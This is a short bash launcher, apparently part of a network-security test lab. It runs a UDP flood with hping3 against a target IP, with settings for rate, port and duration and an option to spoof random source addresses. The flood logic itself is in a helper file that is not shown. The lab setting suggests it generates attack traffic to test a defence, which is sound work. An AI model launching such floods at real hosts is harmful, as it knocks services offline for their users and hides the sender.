#!/usr/bin/env bash
# UDP flood (hping3 --udp), from a fixed source or --rand-source. Attacker host only.
#   bash lab/attacks/udp_flood.sh --target <pi-or-victim-ip> --pi-ip IP --victim-net CIDR --protected-net CIDR \
#        [--rate 3000] [--port 5555] [--rand-source] [--duration 10] [--dry-run]
source "$(dirname "${BASH_SOURCE[0]}")/_common.sh"
parse_common "$@"
hping_flood udp
